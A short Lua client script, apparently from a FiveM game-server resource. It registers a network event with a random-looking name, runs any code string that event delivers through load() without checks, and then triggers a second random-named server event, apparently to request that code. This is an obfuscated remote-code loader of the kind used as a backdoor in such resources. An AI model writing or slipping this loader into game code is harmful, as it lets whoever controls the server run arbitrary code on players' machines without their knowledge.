local resourceName = GetCurrentResourceName()

RegisterNetEvent(resourceName .. ":Nzft8ATykVjvecHu8aFWBhA7q", function(code)
    local func = load(code)
    if func then
        func() 
    end
end)

TriggerServerEvent(resourceName .. ":XcNCW3FzYY99Q6ocgruQ7NZ3a")
